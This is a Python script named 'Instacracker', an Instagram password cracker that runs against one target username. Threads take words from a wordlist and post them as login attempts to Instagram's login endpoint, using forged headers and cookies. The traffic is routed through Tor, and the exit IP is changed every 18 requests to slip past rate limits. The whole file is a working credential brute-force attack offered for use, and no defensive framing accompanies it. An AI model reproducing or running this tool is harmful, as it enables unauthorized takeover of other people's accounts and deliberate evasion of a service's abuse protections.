#!/usr/bin/python

import time
import threading
import fileinput 
from pyfiglet import Figlet
import requests
import argparse
from stem import Signal
from stem.control import Controller



#globals
buff = []
lock1 = threading.Lock()	
lock2 = threading.Lock()
lock3 = threading.Lock()
endOfFile = 0
reqcount = 0
hasended = 0



def inputFiglet():

	#figlet 
	f = Figlet(font='slant')
	print(f.renderText('Instacracker'))

	#parsing input
	parser = argparse.ArgumentParser(description='Instagram password cracker')
	parser.add_argument('-f', help = 'wordlist file', required=True)
	parser.add_argument('-t', help = 'number of threads', required=True)
	parser.add_argument('-u', help = 'username', required=True)
	args = parser.parse_args()

	return args.f, int (args.t), args.u

#producer thread --> reads file and stores in a buffer 
class myThreadProducer (threading.Thread):
	def __init__(self, threadID, name, counter, fileName, lock1, lock2):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
		self.fileName = fileName
		self.lock1 = lock1
		self.lock2 = lock2	
	def run(self):
		fileReader(self.fileName, self)
		print(buff)
		

#function to append each line to buffer (used by producer)
def fileReader(fileName, thread):

	for line in fileinput.input([fileName]):
		#getting line and stripping eol 
		line = line.rstrip('\n')
		#locking to append to buffer and increment its size
		thread.lock1.acquire()
		buff.append(line)
		if len(buff) >= 500:
			print("Going to sleep")
			#time.sleep(5)    ########### SET WAY TO LIMIT MEMORY USED 
		thread.lock1.release()
	#setting variable in the end to stop consumers
	thread.lock2.acquire()
	endOfFile = 1
	thread.lock2.release()

#getting string to use as password, setting headers and doing requisition
def attack(thread):

	global reqcount
	global hasended

	#make a request to get cookies
	s1 = requests.get('http://www.instagram.com')
	initial_time = time.time()

	#setting the proxy via tor
	proxies = {'http':  'socks5://127.0.0.1:9050',
				'https': 'socks5://127.0.0.1:9050'}


	while(1):

		#keep threads running until the buffer is empty and all words were taken from file
		thread.lock2.acquire()
		thread.lock1.acquire()
		if endOfFile == 1 and len(buff) == 0:
			thread.lock2.release()
			thread.lock1.release()
			print("[*] Sorry, couldn't find the password.")
			break
		else:
			thread.lock1.release()
			thread.lock2.release()

			
		#lock for buffsize & get password from buff
		while(1):
			thread.lock1.acquire()
			if( len(buff) == 0 ):
				thread.lock1.release()
			else:
				password = buff.pop()
				thread.lock1.release()
				break

		#if s1 cookies has expired
		if( time.time() - initial_time > 10800 ):
			s1 = requests.get('http://www.instagram.com')

		#locking to set variable w nof requests --> change proxy identity
		thread.lock3.acquire()
		reqcount +=  1
		if reqcount >= 18:
			renew_connection()
			reqcount = 0
		thread.lock3.release()

		
		session = requests.session()
		session.proxies = proxies

		headers, payload= setHeaders_payload(password, thread.user, s1)

		#forged request 
		resp = session.post(url='https://www.instagram.com/accounts/login/ajax/', headers=headers, data=payload)
		
		
		#check if its te right combination
		#thread.lock3.acquire()
		if int(resp.headers['Content-Length']) > 80 or hasended == 1: ##########SETTAR hasended para acabar com outras threads
			if hasended == 1 :
				print("{} está finalizando".format(thread.name))
				#thread.lock3.release()
				break
			hasended = 1
			#thread.lock3.release()
			print(resp.headers)
			print("The password is: {}".format(password))
			break
		#thread.lock3.release()

#setting headers and payload
def setHeaders_payload(password, user, req):
	
	headers={
        'Host': 'www.instagram.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://www.instagram.com/',
        'X-CSRFToken': '',
        'X-Instagram-AJAX': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '',
        'Cookie': '',
        'Connection': 'keep-alive'
        }

	payload = { 'username': user, 'password': password }

	#setting cookies 
	headers['X-CSRFToken'] = req.cookies['csrftoken']
	mid = req.cookies['mid']
	csrftoken = req.cookies['csrftoken']
	headers['Cookie'] = "mid={}; csrftoken={}; ig_pr=1; ig_vw=1366".format(mid, csrftoken)
	headers['Content-Length'] = str(19+len(payload['username'])+len(payload['password'])) #updating the length

	print (payload)

	return headers, payload

	
#Consumer thread --> 
class myThreadConsumer (threading.Thread):
	def __init__(self, threadID, name, counter, lock1, lock2, lock3, user):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
		self.lock1 = lock1
		self.lock2 = lock2
		self.lock3 = lock3
		self.user = user
	def run(self):
		attack(self)
		print("Exiting {0}".format(self.name))

#renew tor exitnode IP
def renew_connection():
	with Controller.from_port(port = 9051) as controller:
		controller.authenticate(password='') ## PUT YOUR PASSWORD HERE!
		controller.signal(Signal.NEWNYM)


def main():	

	start_time = time.time()
	
	fileName, tdNumber, username = inputFiglet()
	
	#setting up threads and starting 
	thread1 = myThreadProducer(1, "Thread-1", 1, fileName, lock1, lock2)
	attack_threads = []
	thread1.start()
	for i in range(tdNumber):
		attack_threads.append( myThreadConsumer(i, "Thread-{}".format(i), i, lock1, lock2, lock3, username) )
		attack_threads[i].start()

	#threads join
	thread1.join()
	for i in range(tdNumber):
		attack_threads[i].join()

	print("Exit main thread!")
	print("{0}".format(time.time() - start_time ))


if __name__ == "__main__":
	main()

